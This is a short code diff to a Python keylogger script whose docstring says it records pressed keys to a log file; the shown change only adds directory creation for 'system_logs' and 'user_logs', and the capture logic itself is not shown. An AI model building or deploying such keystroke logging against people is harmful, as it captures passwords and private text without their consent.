@@ -5,11 +5,17 @@ def main():
 	Reads pressed keys and save them to a log file.
 	"""
 	try:
+		import os
 		import keyboard, json
 		from datetime import date
 	except ImportError:
 		print("[!] Error: Modules not found. Please run 'pip install -r requirements.txt'")
 		exit()
+
+	if (not os.path.exists("system_logs")):
+		os.mkdir("system_logs")
+	if (not os.path.exists("user_logs")):
+		os.mkdir("user_logs")
 
 	try:
 		today = date.today().isoformat()
